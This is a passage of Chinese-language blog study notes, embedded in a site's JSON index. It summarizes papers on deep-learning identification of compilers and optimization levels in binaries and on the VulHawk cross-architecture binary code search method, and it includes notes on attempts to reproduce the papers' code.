使用三种不同的编译器，GCC（4.7，4.8，4.9，5.5，6.5，7.4），Clang（3.8，5.0）和 ICC 19.0，作为工具链设置来编译每个项目，并使用不同的编译器优化级别（O0，O1，O2，O3）。 然后使用IDA Pro从每个二进制文件中标识和提取函数。仅包含几条指令的存根函数等微不足道的函数被删除。在当前设置中，包含少于10条指令的函数被视为微不足道的函数。 在训练阶段，为避免神经模型看到与测试阶段中的函数太相似的函数，仅保留唯一的函数。具体而言，如果一个函数与其他函数具有相同的标准化指令，则认为该函数是冗余的。每个剩余的函数都用用于编译包含该函数的二进制文件的编译器设置进行标记。 使用这些设置，作者构建了一个由 4, 810 个二进制文件中的 854, 858 个唯一函数组成的数据集，每个函数平均包含约 260 条指令。函数大小的分布如图 6 所示，其中 50%的函数包含少于 100 条指令，近 90%的函数包含少于 500 条指令。 B 实现细节和实验设置 我们已经实现了 NeuralCI 作为原型工具。它利用 IDA Pro 解析二进制文件以获取函数及其原始汇编指令。函数抽象模块使用 Java 实现，神经建模模块使用 Python 和 TensorFlow 框架实现。使用 gensim 提供的 skip-gram 实现生成指令嵌入向量，嵌入大小 d 设置为 100。指令序列的最大长度设置为 500，以确保覆盖数据集中近 90%的函数的全部语义。基于卷积神经网络的模型中卷积滤波器的数量设置为 128，GRU 隐藏状态向量的维度也是 128。 对于实验设置，我们将数据集随机分为训练集、验证集和测试集，分别按 80％、10％和 10％的比例。神经网络模型使用 Tesla V100 GPU 卡进行训练，批处理大小为 128，初始学习率为 0.001（当验证损失连续 5 个 epoch 没有改善时，将学习率除以 10），使用 Adam 优化器。对于每个 epoch，训练样本都会被打乱，并计算验证集的准确率。此外，还使用 EarlyStopping 机制，在验证准确率不再上升的 epoch 后停止训练，以避免过度拟合、不收敛等问题。最后，我们将具有最佳准确率的模型作为最终模型，针对性能指标（包括准确率、精度、召回率和 f1-score）在测试集上进行进一步评估。\n评估 我们分别评估了 NeuralCI 在识别编译器家族、优化级别、编译器版本和编译器设置组合方面的性能，并报告了神经网络模型之间的比较结果，以及与支持检测相应编译器设置的现有函数级方法的比较结果。\n1）识别编译器系列的性能 如表 2 所示，NeuralCI 模型在识别编译器家族方面实现了相当高的精度和 f1-score。在编译器族识别任务中，NeuralSD GRU 模型表现最佳，准确率为 98.7%，f1-score 为 0.987。 2）识别优化级别的性能 将 4 个优化级别压缩为 2 个类别：“低”和“高”。 O0 和 O1 被视为低优化类（OL），而 O2 和 O3 被视为高优化类（OH）。 此外，使用将优化级别压缩为 O0，O1 和 OH 的 3 级拆分方式测试模型的性能。 结果表明，NeuralCI 模型在 2 级和 3 级优化压缩情况下都表现出相对良好的检测结果，并且跨模型观察到很少的性能差异。 令人惊讶的是，对于某些模型，NeuralCI 在 3 级优化选项识别任务上的表现甚至比 2 级任务还要好。 NeuralCI 在识别优化级别方面的表现因编译器而异，在 GCC 和 Clang 上观察到最佳和最差的表现。编译器优化级别的不同检测难度意味着不同的编译器采用不同的定义优化级别的方式。 3）识别编译器版本的性能 4）识别编译器设置组合的性能 从二进制文件中检测编译器设置组合通常可以通过联合应用多个模型来实现，每个模型针对不同的设置部分。 首先可以使用用于编译器系列识别的训练模型来检测编译该函数的系列，然后使用相应于已识别的系列的优化级别识别模型进一步检测优化级别。 另一种方法是训练一个可以同时检测这些设置的单个模型。 为了检查 NeuralCI 是否能够胜任这项具有挑战性的任务，我们首先评估其识别编译器系列和优化级别的性能。如表 6 所示的结果显示，NeuralCI 中的所有模型都表现出相对良好且类似的检测性能。此外，表 7 报告了 NeuralCI 在同时识别所有编译器设置组合方面的结果，其中在不同模型之间观察到的准确率在 81.5％至 83.8％之间。 ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/fine-grained-compiler-identification-with-sequence-oriented-neural-modeling/","summary":"中文译名：基于面向序列的神经模型的细粒度编译器识别 作者：ZHENZHOU TIAN 单位： 西安邮电大学 国家： #中国 年份： #2021年 来源： #IEEE_ACCESS 关键字： #","title":"Fine-Grained Compiler Identification With Sequence-Oriented Neural Modeling"},{"content":"中文译名：多体系结构二进制代码中编译器和优化级别的识别 作者：DAVIDE PIZZOLOTTO 单位：大阪大学 国家： #日本 年份： #2021年 来源： #IEEE_ACCESS 关键字： #编译 #二进制 #神经网络 代码地址：GitHub - inoueke-n/optimization-detector: Optimization detection over compiled binaries 笔记建立时间： 2023-02-20 14:44\n摘要 在比较不同的二进制文件时，确保相同的编译器和编译标志尤其重要，以避免不准确或不可靠的分析。 要理解使用了哪些标志和优化，需要对目标体系结构和所使用的编译器有深入的了解。 在这项研究中，我们提出了两种深度学习模型，用于检测编译二进制文件中的编译器和优化级别。我们研究的优化级别是 x86_64、AArch64、RISC-V、SPARC、PowerPC、MIPS 和 ARM 架构中的 O0、O1、O2、O3 和 Os。此外，对于 x86_64 和 AArch64 体系结构，我们还确定编译器是 GCC 还是 Clang。 我们创建了一个超过 76000 个二进制数据集，并将其用于训练。我们的实验表明，在检测编译器时，准确率超过 99.95%，在检测优化级别时，根据架构的不同，准确率在 92%到 98%之间。此外，我们分析了当数据量极其有限时，准确性的变化。我们的研究表明，使用函数级粒度准确检测编译器标志设置和优化级别是可能的。 1引言 编译器信息和优化等级等信息对于各种应用程序都非常有价值，比如对旧版本进行分类，查找漏洞，查找二进制文件中的相似性，重写二进制文件，或者在编译环境无法控制的情况下提供准确的错误报告。 虽然有几篇关于检测编译器[5]和工具链[8]使用的论文，但这些方法不依赖于自动学习方法。使用基于机器学习的方法，提供新数据并重新运行训练以检测新的编译器或标志就足够了。使用我们工作中提供的自动数据集生成，对于我们想要分类的每个优化级别，生成这些数据所需的时间是几个小时。 在这项研究中，我们提出了在不同架构中使用长短期记忆网络 (LSTM)[9]和卷积神经网络 (CNN)[10]来识别编译器和优化级别的方法。 作者指出本文的进步在于 测试的优化等级和测试数量的增加：优化等级测试次数由{O0, O2}增加到{O0, O1, O2, O3, Os}。•测试的架构数量从{x86_64}增加到{x86_64, AArch64, RISC-V, SPARC, PowerPC, MIPS, ARM32}。 提供了数据集和自动化生成数据集的脚本 神经网络结构的实现和调整 2动机 在一些应用场景中编译器信息和优化等级信息是必须的 二进制重写中，不了解优化等级可能会导致重写的编译失败 反编译中，编译器信息和优化等级信息会帮助判断反编译后得到的源代码的正确性 二进制文件比较中，编译器的优化会带来极大的误导 3前期工作 本文工作特点：\n不仅研究标志的检测，还研究编译器的检测 研究了七种不同架构的检测，而不是只有一种 分析目标不仅是最大限度地提高准确性，而且最小化所需的输入 数据集比[25]大 100 多倍，反驳了之前研究的一些说法 4方法 试图解决的问题是，当只有一部分二进制代码可用时，确定优化级别，具体来说，给定一个来自二进制文件的任意长度的字节 v 序列，我们希望训练一个分类函数 Mflags，它能够预测编译标志，以及一个分类函数 Mcompiler，它能够预测所使用的编译器。 Mflags 对输入的二进制文件的优化级别进行分类，以常用的优化水平{O0, O1, O2, O3, Os}为目标 同时针对不同的架构训练了不同的 mflags 并期望用户根据输入架构选择预测模型。二进制文件的体系结构很容易被文件等工具识别，因此这一事实并不是一个限制，并简化了训练。 同样针对编译器 gcc 和 clang，也训练了两个不同的 mcompiler 我们的目标不仅是最大化精度，而且要使字节 v 的序列尽可能小; 第 IV-B 节中解释如何将二进制代码转换为 v (或几个 v)，即我们的学习网络所期望的输入。 为了比较不同模型的性能，我们使用前馈卷积神经网络 MCNN 和长短期记忆网络 MLSTM 来训练所有上述配置，总共产生 7MCNN 标志，7 MLSTM 标志，2 MCNN 编译器和 2 MLSTM 编译器。这些网络在几个不同的数据集中进行训练，在第 IV-A 节中详细解释，并比较了它们的预测结果。 数据集 作者指出因为需要进行监督学习，所以我们需要知道数据集的编译器类型和优化级别，虽然我们在编译的时候可以掌握这些信息，但是在链接的时候，静态库文件被链接到二进制文件，这些库文件的编译器信息和优化等级我们并不知道，我们需要的二进制文件被这些库文件污染了。 为了避免上述的问题，作者采用创建一个只有共享库的系统，然后使用该系统构建数据集的方法。 本机编译 为了解决本机构建系统中的静态链接问题，作者执行了以下步骤:\n我们从主机上构建了一个没有特定编译器和优化级别的工具链。 我们确保在这个工具链中只构建共享库。2) 我们创建了一个只包含工具链的 chroot 环境，将其与原始构建系统隔离开来。 我们构建了实际的数据集，使用所需的编译器和优化级别。 交叉编译 使用 Ubuntu 现有的工具链 没有构建 clang 的数据集，值针对 GCC 进行分析 预处理 目标：将二进制文件转换为一个或多个输入向量 比较了两种方法：一种是字节流，一种是按照函数边界拆分 方法一：原始字节 为了生成这种表示，我们使用 readelf 转储可执行文件的. text 部分，并将其划分为固定大小的块。（大小是可变的） 缺点是我们不知道原始数据是表示指令还是堆栈数据。 方法二 Radare2 用于从可执行文件中提取每个函数 删除了表示指定要使用的寄存器的字节（红色字节） 删除了操作数（绿色） 保留命令（蓝色），只有这部分的字节进行了编码 在这两种表示中，我们将数据作为时间序列提供给网络，其中每个时间点实际上是二进制文件中的一个字节的数据。例如，图 2 的前两条指令将在原始字节方法中使用这个向量:[0x48, 0x89, 0x44, 0x24, 0x18, 0x31, 0xC0]。在编码的表示中，它们将是[0x89, 0x31]。 填充 因为函数的长度总是不同的，所以需要通过填充来使得输入向量长度相同。并且当使用无填充向量训练出来的模型不能很好的推测有填充的数据。\n为了解决这个问题，我们在区间[0，α]中截断一个随机字节数，其中 $α=len(v)-32$，v 是输入向量字节大小。 随机量是由指数分布定义的。我们的目的是使用一个分布，其中 99%的值落在上述区间内，同时将异常值限制在 32。在这种情况下，网络将主要接收低填充向量，而偶尔遇到填充最多的向量。利用指数累积分布函数 y = 1−e−λx，将 y 固定为 0.99, x 固定为α，得到 $λ=\\frac{2\\ln_{}{10} }{\\alpha }$ 在截断输入之后，我们通过加 0 来预扩展它。（如下图所示） 网络 事实上，我们将优化识别问题建模为模式识别问题: 一个特定的优化可以被网络识别为输入字节序列中的操作码模式。\n所以使用 CNN 和 LSTM 模型它们在 NLP 和图像处理领域表现的好 LSTM 第一个模型如图 4 所示。这个模型描述了一个简单的 LSTM，我们的核心思想是训练这种模型通过一长串属于二进制的字节来记忆特定的模式，表示编译器或优化级别。 嵌入层输入和输出维度分别是 256（输入是 8 位 2 个字节） 和 128，该层将二进制编码成输入向量 然后使用 256 个单元的 LSTM 层进行实际学习，使用双曲正切 (tanh) 作为激活函数 最后一部分是一个密集层，对于二进制情况有 1 个输出和 Sigmoid 激活，对于多类情况有 5 个输出和 Softmax 激活。 优化器是 adam，学习率为 0.003 CNN 其思想是使用一系列卷积从作为输入传递的原始字节序列中提取高维信息。 第一层和 LSTM 相同 然后使用卷积、卷积和池化三个块。在图中，卷积层的标签 k3n32s1 表示内核大小为 3，过滤器数量为 32，步幅为 1。在这些块中，卷积用于从字节序列中提取特征，池化用于使这些特征独立于它们在序列中的位置。 因为 ReLU 存在梯度消失的问题，所以使用了 leakyReLU 在输出之前，使用由 1024 个神经元组成的最终全连接层，然后使用 ReLU 激活和正则密集层和 sigmoid 进行二进制分类或使用密和 softmax 进行多类分类。 优化器是 Adam，学习率为 10−3。 所有模型均以二元交叉熵作为二元分类的损失函数，以范畴交叉熵作为多类分类[33]的损失函数。 使用超带算法[34]估计 LSTM 和 CNN 的超参数。我们在区间[32, 1024]中使用 2 的幂作为空间搜索，除了内核大小和 stride 之外。对于内核大小，空间搜索是集合{3, 5, 7}。相反，对于 stride，空间搜索是{1, 2}。\n评估 准确性 根据架构划分了数据集\n每个样本的特征数量是来自指定架构的 2048 个连续字节，按优化级别分类。\n我们为每个数据集训练了 CNN 和 LSTM 模型，得到了优化水平检测的结果如表 2 所示。（注意，除非另有说明，所有结果都是使用原始编码和填充数据获得的。）\n准确度的计算公式： 我们可以注意到\nLSTM 总是比 CNN 好 在两个网络中，x86_64、RISC-V 和 PowerPC 的精度都是最差的。 使用 LSTM 的缺点是它需要大量的训练时间，CNN 比 LSTM 快两到三倍 LSTM 大约需要 7 个 epoch 才能在第一个 epoch 结束时达到与 CNN 相同的精度。 为了进一步研究准确率，图 7 显示了使用 CNN 训练的每个模型的所有混淆矩阵。从图中可以看出，问题的部分是 O2 和 O3 之间的区别。事实上，O0 和 O1 在任何架构中都可以以 99%的准确率检测到，而 Os 永远不会低于 96%。然而，O3 在最坏的情况下，错误的分类比正确的分类更多，正如我们在 PowerPC 和 RISC-V 中看到的那样。当使用 LSTM 时，这种情况稍微好一些。结果如图 8 所示。在这张图中，我们可以看到 LSTM 在 AArch64、SPARC、MIPS、ARM 等架构下是如何达到较高精度的。CNN 的架构问题仍然存在于 LSTM 中，但程度要小得多。事实上，没有哪个优化级别报告的错误分类比正确分类更多，PowerPC O2 的最坏情况准确率为 70%。\n为了缓解这个问题，我们训练了两个额外的数据集: Dmerged 和 dsplit: 第一个包含所有优化标志，但将 O2 和 O3 合并在一起，第二个只包含 O2 和 O3。图 9 报告了这种数据集分裂的情况。我们可以注意到，从数据集的其余部分分离 O2 和 O3 后，CNN 网络的表现略好，而 LSTM 与未分离的结果相比，表现略差。\n关于编译器检测，结果如表 4 所示。该表显示了两种架构中的两个网络如何出色地执行。即使在带有 CNN 的 x86_64 案例中，优化检测表现很差，错误分类为 587 个，而正确分类为 1225822 个。考虑到 CNN 的高精度和与 LSTM 相比更快的速度，它应该是编译器检测的首选。\n最小的字节 本节将研究用函数粒度检测优化级别和编译器的可能性。 为此，我们对每个模型执行评估，同时输入逐渐增加的字节数。因此，我们执行初始评估时，每个样本只有 1 个字节; 然后，我们用 2 个字节执行第二次求值，以此类推，直到我们使用了 2048 字节的完整向量长度。 图 10 显示了使用 CNN 网络获得的结果。图 11 显示了相同的结果，但使用的是 LSTM 网络。 注意在 LSTM 网络中，每种架构都遵循相同的检测趋势。然而，与其他架构不同的是，在 CNN 架构中，x86_64、PowerPC 和 RISC-V 的准确性停止了增长。 这三个体系架构在 V-A 节的混淆矩阵中也是问题最严重的三个架构，但是 LSTM 不会发生这种情况，说明 CNN 不太能很好的识别这些架构中的 O2 和 O3 优化。 同时对于任意数量的字节，LSTM 的性能肯定要好于 CNN 为了突出显示这一点，图 12 显示了 LSTM 和 CNN 在单一体系结构 x86_64 中的直接比较。该图显示了 LSTM 的预测与 CNN 的预测相比，总是有大约 5%的准确性。 在分析了输入长度变化时整体精度如何变化之后，我们现在要检查平均函数长度是否足以达到良好的精度。\n其思想是计算每个优化级别的平均函数长度，并在特定长度处检查该特定级别的网络的准确性。我们分解了每个优化级别和编译器的每个二进制文件，并计算了组成每个函数的字节数。结果如图 13 所示。 但是平均值不太准确，会受到一些具有非常高的字节数 (大约 106 个字节) 的异常值的影响。 下图展示了选取的中位值和对应的准确度，同样在 O2 和 O3 上表现很垃 关于编译器检测，增加字节数的精度图可以在图 14 中看到。与用于优化级别检测的 CNN 和 LSTM 比较不同，在图 12 中，我们可以看到两个网络之间的差异非常小，即使输入更短。此外，即使在没有太多数据可用的情况下，准确性也很高; 例如，只有 100 个字节，就有可能有超过 90%的准确率。这意味着我们可以正确地预测编译器，即使是函数粒度。 总结：在执行函数粒度分析时，输入较短，通常可以检测 O0、O1 和 Os 优化级别。相反，考虑到 O2 和 O3 的细微差别，它们需要尽可能多的字节。相比之下，编译器检测就不会遇到这个问题，即使只有 102 个输入字节，也能达到很高的精度。\n编码 在本节中，我们将原始输入与第 IV-B 节中解释的编码变体进行比较。分析结果如图 15 所示，其中只描述了 x86_64 体系结构。 编码后的变体在输入长度约为 250 字节时达到了最大精度。相反，原始输入变量，随着更多的字节提供给它，精度稳步提高，超过了这个限制。 在分析编译器检测时也可以看到类似的情况，如图 16 所示。在这种情况下，我们可以看到编码的变体在没有进一步改进的情况下达到了大约 100 字节的最大精度。相比之下，原始数据的准确性继续提高，在 150 字节时优于编码变体，在 1000 字节时达到峰值。 然而，我们决定不将此分析扩展到所有 7 个架构。事实上，在第一节中，我们研究的动机之一是有一种自动检测优化标志的方法，这种方法不需要深入了解底层架构。然而，要生成编码的变体，有必要掌握目标体系结构的基本知识，这与我们最初的动机相矛盾。这一事实，除了性能差和需要精确的拆卸，促使我们放弃了编码变体的研究。 在结束本节之前，值得注意的是，Chen 等人的研究使用了一个小 100 倍的数据集，并确定编码变体明显更好[11]。在我们之前的研究中，我们使用了一个比当前数据集小 10 倍的数据集，并确定编码变量与原始变量[12]相同。我们可以很容易地假设，对于较小的数据集，网络学习原始数据中哪些信息有用，哪些信息没有用的能力较差。这就解释了为什么在以前的研究中，没有无用前缀的编码变体提供的数据更具竞争力。然而，对于一个足够大的数据集，编码的变体并不能提供任何优势。 总结：分解和编码数据并不能提供额外的好处，需要了解底层架构和函数分解才能获得较低的整体精度。\n填充 在第 IV-B 节中，我们断言，如果在训练期间从未填充原始字节序列，然后预测填充序列，那么我们的网络性能会更差。在本节中，我们将介绍 RQpad，并研究在训练期间填充和不填充之间的区别。有填充和无填充变体之间的差异如图 17 所示 从图中，我们可以看到，在计算小输入向量时，训练过程中填充的缺失是一个问题。 总结：如果在训练过程中从未填充输入，网络在预测较短序列时的准确性将显著降低。\n","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E8%AF%A6%E7%BB%86%E7%AC%94%E8%AE%B0/identifying-compiler-and-optimization-level-in-binary-code-from-multiple-architectures/","summary":"中文译名：多体系结构二进制代码中编译器和优化级别的识别 作者：DAVIDE PIZZOLOTTO 单位：大阪大学 国家： #日本 年份： #2021年 来源： #IEEE_ACCESS 关键字： #编译","title":"Identifying Compiler and Optimization Level in Binary Code From Multiple Architectures"},{"content":"代码地址：GitHub - inoueke-n/optimization-detector: Optimization detection over compiled binaries [[Identifying Compiler and Optimization Level in Binary Code From Multiple Architectures]]\n准备 实验用到的数据集 following link. 也可以自己按照 readme. md 文件中的 generation 节中的步骤来自己生成数据集。（因为文章中提到的担心被库文件污染，所以需要 docker 环境来生成） 文档结构 Resources 存储测试的二进制文件 Tests 和 src 文件存储源代码 generate_dataset.py 文件负责生成数据集（准确的说是交叉编译生成所需的二进制文件） optimization-detector.py 文件负责文件的提取（可执行数据），预处理（平衡数据集），训练、评估、推断。 数据集文件结构 Dataset 文件夹下的是已经经过预处理的数据集，raw 后缀表示采用原始字节作为输入，func 表示按照函数边界进行了拆分\n但是没有优化等级是 O3 的数据啊 突然懂了这个逻辑，process 的输入是 func 和 raw 文件，输出 train. bin、test. Bin、validate. Bin 文件，然后 train 用 train. Bin 、validate. Bin 文件训练，evaluate 用 test. Bin 看效果\nMulti 表示将 gcc 和 clang 混合\n复现 首先要安装依赖 因为直接用作者数据集，所以先跳过数据生成和处理的部分\n评估 python3 optimization-detector. py evaluate -m \u0026lt;model\u0026gt; -o output. csv \u0026lt;dataset_dir\u0026gt;\nModel 是. h5 文件 Dataset_dir 是 test. bin 文件，但是注意这里写路径就行，不用指明文件名（因为代码里面写死了文件名就是 test. bin） 这里有个坑，代码里面会验证数据集的第一个字节是不是 27，但是作者给的数据集里面的数据文件第一个字节都是 26，需要手动改一下 2.27，现在卡在了作者自定义的 generator 类与 TensorFlow 的 data_adapter 不协调上 训练 python3 optimization-detector.py train -n \u0026lt;network_type\u0026gt; \u0026lt;model_dir\u0026gt;\nnetwork_type 选择 lstm 或者 cnn model_dir 是包含数据集（预处理后）的文件夹 会在 model_dir 路径下生成 logs 文件夹 问题 数据集里面怎么还有一个代码文件 没有 O3 级别的数据集 貌似也没有区分架构 为什么多分了一个全连接层的模型 Mixed 未知 ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/identifying-compiler-and-optimization-level-in-binary-code-from-multiple-architectures%E5%A4%8D%E7%8E%B0/","summary":"代码地址：GitHub - inoueke-n/optimization-detector: Optimization detection over compiled binaries [[Identifying Compiler and Optimization Level in Binary Code From Multiple Architectures]] 准备 实验用到的数据集 following link. 也可以自己按照 readme. md 文件中的 generation 节中的步骤来自己生成数据集。（","title":"Identifying Compiler and Optimization Level in Binary Code From Multiple Architectures复现"},{"content":"[[Fine-Grained Compiler Identification With Sequence-Oriented Neural Modeling]] 实验评估中用 NeuralBS CNN，NeuralSD CNN 和 NeuralAD CNN 来表示基础 CNN，带有缩放点积注意力的增强 CNN 和带有附加注意力的增强 CNN 在以下实验评估中使用 NeuralBS GRU，NeuralSD GRU，NeuralAD GRU 和 NeuralQU GRU（SD 和 AD 和 CNN 一样，QU 是新加的）\n识别编译器系列 family 识别编译器版本 version 识别优化级别 binaryOptimization 和 tripleOptimization\n目前存在的问题：\nFull 和 done 后缀的文件不明白用途，Binary 和 done 的区别 TensorFlow 版本不兼容，需要改部分代码 代码中的文件路径指向（所需要的）文件没有，貌似需要自己构建数据集（IDA pro 提取什么的） ","permalink":"https://juhuax.github.io/posts/study/1.%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%BC%96%E8%AF%91%E4%BC%98%E5%8C%96%E5%88%86%E6%9E%90/%E5%A4%8D%E7%8E%B0/neuralci-%E5%A4%8D%E7%8E%B0/","summary":"[[Fine-Grained Compiler Identification With Sequence-Oriented Neural Modeling]] 实验评估中用 NeuralBS CNN，NeuralSD CNN 和 NeuralAD CNN 来表示基础 CNN，带有缩放点积注意力的增强 CNN 和带有附加注意力的增强 CNN 在以下实验评","title":"NeuralCI 复现"},{"content":"中文译名：VulHawk：基于熵的二进制代码搜索的跨架构漏洞检测 作者：Zhenhao Luo 单位：国防科大 国家： #中国 年份： #2023年 来源： #NDSS会议 关键字： #二进制代码搜索 代码地址： https://github.com/RazorMegrez/VulHawk 笔记建立时间： 2023-03-20 13:59\n摘要 目的：对不同架构、不同编译器、不同优化级别编译的 IoT 固件映像进行二进制代码搜索来识别代码重用 方法：\n提出了一种新的中间表示函数模型，是一种用于跨体系结构二进制代码搜索的体系结构不确定模型 将二进制代码提升为 IR，通过补充隐式操作数和删除冗余指令来保留二进制函数的主要语言 使用 NLP 和卷积生成函数嵌入 将编译器、架构和优化级别的组合称为一个文件环境，采用 divide-and-conquer 策略将 $C_N^2$ 个跨文件环境场景的相似性问题转化为 $N-1$ 个嵌入转化子问题。 提出了一种基于熵的适配器，将不同文件环境中的函数嵌入传输到同一文件环境中，以缓解不同文件环境造成的差异 提出了一种渐进搜索策略 用细粒度特征补充函数嵌入，以减少修补函数造成的误报 意义：提高检测代码重用带来的漏洞的效率 效果：VulHawk 的性能优于 Asm2Vec、Asteria、BinDiff、GMN、PalmTree、SAFE 和 Trex。\n引言 现状：\n二进制代码搜索方法不够健壮，不能跨平台 Asm2Vec[10]、DeepBinDiff[11]和 PalmTree[27]使用自然语言处理 (NLP) 技术取得了令人鼓舞的结果（不能跨平台） InnerEye[60]将来自不同 isa 的二进制作为不同的自然语言，并使用神经机器翻译来计算二进制代码的相似度。SAFE[35]使用来自多个 isa 的二进制来训练其语言模型，以跨体系结构搜索二进制代码。（严重依赖于训练数据，很难实现多个 isa） 将特定于体系结构的二进制代码提升为与体系结构无关的中间表示 (IR) 是解决物联网固件中跨体系结构挑战的有效方法。但是 IR 和自然语言有本质区别。 相同源码经过不同优化级别的编译器编译后得到的二进制文件语义相似但结构不同 在本文中，我们考虑了 3 种架构 (x86、arm 和 mips)、2 种字大小 (32 位和 64 位)、2 个编译器 (Clang 和 GCC) 和 6 个优化级别 (O0、O1、O2、O3、Os 和 Ofast)，总共 72 种组合 (3 × 2 × 2 × 6)。 本文提出了一种新的跨架构二进制代码搜索方法 VulHawk\n新的中间表示函数模型 (IRFM)——来生成健壮的函数嵌入——解决跨架构和指令简化 部署了一个基于熵的适配器——对不同编译器、体系结构和优化级别的二进制文件进行处理，缓解不同环境造成的差异 渐进搜索策略来搜索候选函数 提出一种相似度标定方法——减少误报 背景 问题定义 一个有效的跨架构的二进制代码搜索需要实现：\n支持跨架构 支持跨编译器 支持跨优化 高精度和效率 熵理论 香农的熵理论可以用来衡量系统中的随机性和平均信息量 通过熵分析，我们可以在深入研究系统之前预先了解系统中的平均信息量。在二进制代码搜索任务中，我们通过二进制文件熵得到二进制文件的信息分布，它可以推断出二进制文件的编译器和优化级别等信息。这有助于我们的模型为不同的输入二进制选择合适的参数。\n设计 IR 函数模型（IRFM） 将二进制代码的 IR 作为中间表示函数模型 (IRFM)（基于 RoBERTa 模型）的输入，输出是 IR 的词嵌入。 IRFM 将 IR 函数嵌入到高维嵌入空间中，使得语义相似函数的嵌入在数值空间中更加紧密。\nTokenization 将一条指令分割为一个操作码和三个操作数 用特殊标记 addr 来规范地址 对于 OOV （Out-Of-Vocabulary)）问题，作者引入 16 个根操作数，表内的操作数就使用自己的 token，非表内操作数就使用对应的根 token 在预训练阶段，我们将频率小于 100 次的令牌替换为其根操作数令牌，以构建根操作数令牌嵌入。 语言模型 IRFM 基于 RoBERTa 模型，但是 IR 和自然语言有所不同，所以作者进行了部分改动\nToken 类型层 使用令牌类型层来帮助 IRFM 区分操作码和操作数。将令牌分为三种类型: 操作码、操作数和其他。其他类型包括没有实际语义的特殊标记。 指令简化 二进制代码包含 EFLAGS (即标志寄存器) 作为隐式操作数。不考虑 EFLAGS，重要的语义会丢失，考虑所有的 EFLAGS，冗余的 eflag 不仅会引入额外的开销，而且可能会模糊二进制代码的主要语义。 所以只考虑使用过的 eflags，通过 IR 将每个隐式操作数指令的赋值转换为实赋值指令，并将其使用的 EFLAGS 保存为指令序列 如下图所示 a 到 b 删除了没有使用到的寄存器和标志寄存器，b 到 c 又对值传递进行了优化（化简） 提出了一种基于 def-use 关系的指令简化方法 标记重要指令（使用松散规则，以确保不会错误地删除主语义）： 目标操作数为内存地址的赋值指令（因为全局变量和局部变量存储在内存中而不是寄存器中） 在所有路径的返回指令附近根据调用约定标记特定的寄存器（因为返回值通常存储在特定的寄存器） 修剪未使用的指令 将其定义的寄存器或 EFLAGS 未在后续指令中使用的指令视为未使用的指令 优化冗余指令（值传递指令） 预训练任务 在训练阶段，我们使用 Masked Language Model (MLM)、根操作数预测 (ROP) 和相邻块预测 (ABP) 进行预训练。\nMasked Language Model 我们引入了 MLM 模型来理解之间的关系，并建立合适的词嵌入。 根操作数预测 用于解决 OOV 问题，为 OOV 操作数匹配根操作数 token 邻块预测 因为数据流的存在，所以基本块数顺序敏感的，ABP 预训练是为了让模型捕获这种数据流关系 具体来说，给定两个基本区块 A 和 B，其中 B 是 A 的后继区块，变量 x 定义在区块 A 中，变量 x 使用在区块 B 中，我们将 A-B 的顺序标记为正，B-A 的顺序标记为负。注意，A 和 B 不是同一个块，A 也不是 B 的后继块。另外，我们不认为这些情况下 A 和 B 只有控制流关系而没有数据流关系。因为如果不支持数据流关系，块的顺序也可能颠倒。我们将 IRFM 中令牌[cls]的最终隐藏状态输入到 ABP 头中，这是一个线性变换，以识别输入的两个微码序列是否正序。 函数嵌入生成 首先生成基本块嵌入\n对于输入的 IR 块，IRFM 转化编码器输出隐藏状态序列，然后在倒数第二层的隐藏状态上使用均值池来生成基本块嵌入。（因为研究表明倒数第二层的隐藏状态比最后一层的隐藏状态具有更强的泛化能力。） 集成基本块嵌入和 cfg 来生成函数嵌入\n使用 GCNs 捕获 CFG 结构，将二进制函数视为属性图，其中它们的基本块是图中的节点，它们的嵌入是节点的属性。我们将属性控制流图 (acfg) 输入到 GCN 层。 基于熵的适配器 Divide-and-conquer 图 5 显示了在嵌入空间中匹配相似函数的示例。可以看到混合文件环境的文件经过适配器后进行了统一。（可以理解为一个翻译器） 首先，我们将混合文件环境的嵌入空间拆分为多个嵌入子空间。 其次，选择其中一个文件环境 V 作为中间文件环境，将 N 个具有 C2 N 个场景的文件环境中的函数相似度问题划分为 N−1 个子函数嵌入传递问题。 最后，我们使用经过训练的适配器将不同文件环境的函数嵌入传递到同一个文件环境 V 中进行相似度计算，可以缓解不同文件环境造成的差异。\nEntropy-based Binary Analysis 用于识别文件环境 因为二进制文件中没有直接指示编译器和优化级别的信息，所以从信息理论的角度来理解二进制文件，并引入熵来识别二进制文件的编译器和优化级别 图 6 显示了来自 3 个文件环境的 12 个不同二进制文件的熵流。可以观察到，来自相同文件环境的熵流似乎是相似的，而来自不同文件环境的熵流却不同。使用熵流和熵理论，我们可以识别不同的编译器和优化。 使用残差神经网络 (ResNet) 作为分类器，并使用上述特征作为识别文件环境的输入。基本残块结构如图 7 所示。它由批量归一化和线性变换组成，激活函数为 ReLU。使用来自输入的标识映射的跳过连接被添加到基本剩余块输出中，这保留了函数语义，并有助于解决梯度消失问题。我们使用卷积层对输入进行采样，该层将 258 维输入转换为 64 维特征。在 16 层剩余基本块之后，我们使用线性预测和 softmax 函数进行多类分类。由于 Os 和 Ofast 分别是对 O2 和 O3 的增量优化，因此我们将 Os 和 Ofast 分别包含在 O2 和 O3 中。这里，softmax 的目标是 8 个类 (2 个编译器× 4 个优化)。熵分析帮助我们识别文件环境 (编译器和优化级别)，为后续的函数嵌入传输做准备。\nEntropy-based Adapter layer 为了计算来自不同文件环境的二进制函数的相似性，我们在 IRFM 之后提出了一个基于熵的适配器层。基于熵的适配器层作为映射 F，将不同文件环境中的函数嵌入传递到相同的中间文件环境 V 中，以缓解不同文件环境造成的差异。映射 F 既应保留函数语义，又应减轻因不同文件环境而产生的偏差。\n渐进搜索策略 现状 